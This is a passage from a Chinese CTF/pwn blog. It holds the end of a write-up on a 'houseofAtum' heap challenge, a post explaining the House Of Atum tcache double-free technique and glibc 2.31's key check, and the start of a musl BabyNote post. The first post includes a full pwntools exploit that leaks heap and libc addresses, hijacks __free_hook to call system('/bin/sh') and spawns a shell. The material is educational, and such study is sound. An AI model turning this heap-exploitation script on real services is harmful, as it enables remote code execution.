<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">1</span> &amp;&amp; notes[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)notes[index]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Clear?(y/n):&quot;</span>);</span><br><span class="line">  readn(key, <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">    notes[index] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>UAF</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>libc-2.27 没有 key 值限制，可以随便 Double free</p>
<p>将同一个 chunk 释放两次就可以使其 <code>chunk-&gt;FD</code> 指向它自己，于是可以轻松泄露出 <code>heap_base</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    dele(<span class="number">1</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2b0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>使用 House Of Atum 连续释放同一个 chunk 8 次可以将其放入 fastbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x55e3e486d260</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55e3e486d250</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现这个 chunk 同时存在于 tcache 和 fastbin 中</li>
<li>申请掉 tcache 中的 chunk，并向其中写入 fake chunk addr，实现堆覆盖</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x55bdfed93250</span> —▸ <span class="number">0x55bdfed93240</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>然后搭一搭堆风水，修改 <code>chunk-&gt;size</code> 使其进入 unsortedbin，泄露 <code>libc_base</code></p>
<p>最后劫持一下 <code>free_hook</code> 就可以了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./houseofAtum&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x269F)\n&quot;)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Input the content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Input the content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index,key</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Clear?(y/n):&quot;</span>,key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="string">&quot;b&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0x11</span>)</span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    dele(<span class="number">1</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2b0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(heap_base+<span class="number">0x250</span>-<span class="number">0x10</span>)</span><br><span class="line">add(payload)</span><br><span class="line">add(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;malloc_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(free_hook-<span class="number">0x20</span>))</span><br><span class="line">payload = p64(free_hook-<span class="number">0x10</span>)</span><br><span class="line">add(payload)</span><br><span class="line">dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(system_libc)</span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/10/House%20Of%20Atum-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/10/House%20Of%20Atum-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Atum-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-10 16:58:09 / Modified: 16:58:55" itemprop="dateCreated datePublished" datetime="2023-03-10T16:58:09+08:00">2023-03-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Atum"><a href="#House-Of-Atum" class="headerlink" title="House Of Atum"></a>House Of Atum</h2><p>在 libc-2.31 之前，tcache 还没有 key 值保护，因此实现 Double free 是很简单的事情</p>
<p>甚至可以把同一个 chunk 连续释放8次，使其进入 fastbin（同时它自身还会存留在 tcache 中）</p>
<p>利用场景：</p>
<ul>
<li>glibc &lt; 2.31（没有 key 检查）</li>
<li>double free</li>
</ul>
<h2 id="glibc2-31下的Tcache检查"><a href="#glibc2-31下的Tcache检查" class="headerlink" title="glibc2.31下的Tcache检查"></a>glibc2.31下的Tcache检查</h2><p>对于每一个 tcache 中的 chunk，增加了一个 key 指针，用于指向所属的 tcache 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>  <span class="comment">// 链表指针,对应chunk中的fd字段</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>  <span class="comment">// 指向所属的tcache结构体,对应chunk中的bk字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
<p>当 chunk 被放入时会设置 key 指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"> </span><br><span class="line">  e-&gt;key = tcache;  <span class="comment">// 设置所属的tcache</span></span><br><span class="line"> </span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx]; <span class="comment">// 单链表头插法</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  </span><br><span class="line"> </span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">// 计数增加</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ptmalloc 使用了一种更机智的方法，在不影响效率的前提下，完成了对double free的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"><span class="comment">// 只要tcache不为空,并且这个chunk属于tcache管辖范围,那么这个chunk就有可能已经在tcache中了,所以需要double free检查</span></span><br><span class="line"><span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果是double free,那么put时key字段被设置了tcache,就会进入循环被检查出来</span></span><br><span class="line"><span class="comment">    如果不是,那么key字段就是用户数据区域,可以视为随机的,只有1/(2^size_t)的可能行进入循环,然后循环发现并不是double free</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache)) <span class="comment">// 剪枝</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 通过检查,放入tcahce中</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put(p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单来说：</p>
<ul>
<li>在 free chunk 被放入 tcache 时，程序会设置一个 key 值</li>
<li>每次程序把 new free chunk 放入 tcache 前，都会检查一下它是否携带有 key 值</li>
<li>注意：key 值原本的位置是用户数据区（可以认为是随机值），有极小的概率会触发检查报错</li>
</ul>
<h2 id="House-Of-Atum-利用姿势"><a href="#House-Of-Atum-利用姿势" class="headerlink" title="House Of Atum 利用姿势"></a>House Of Atum 利用姿势</h2><p>House Of Atum 通常在那些限制节点数量的题目中使用（在可利用节点小于7个的情况下将某个 free chunk 放入 fastbin）</p>
<ul>
<li>以下案例展示把同一个 chunk 连续释放8次的情况：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for i in range(7):</span><br><span class="line">    dele(1,&#x27;n&#x27;)</span><br><span class="line"></span><br><span class="line">dele(1,&#x27;n&#x27;)</span><br></pre></td></tr></table></figure>
<ul>
<li>连续释放7次后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x564499ecc2b0</span> ◂— <span class="number">0x564499ecc2b0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>释放第8次后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x50</span> [  <span class="number">7</span>]: <span class="number">0x564499ecc2b0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x564499ecc2a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>现在该 chunk 同时存在于 tcache 和 fastbin 中</li>
<li>构造好堆风水，覆盖伪造的 <code>chunk-&gt;fd</code></li>
<li>实现堆重叠并修改 <code>chunk presize/size</code> </li>
</ul>
<h2 id="版本对-House-Of-Atum-的影响"><a href="#版本对-House-Of-Atum-的影响" class="headerlink" title="版本对 House Of Atum 的影响"></a>版本对 House Of Atum 的影响</h2><p>libc 版本必须小于 2.31</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/09/musl%20pwn%20%E5%88%9D%E6%8E%A2+%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/09/musl%20pwn%20%E5%88%9D%E6%8E%A2+%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">musl pwn 初探+环境搭建</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-09 23:53:52 / Modified: 23:55:05" itemprop="dateCreated datePublished" datetime="2023-03-09T23:53:52+08:00">2023-03-09</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>BabyNote 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babynote: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so<span class="number">.1</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
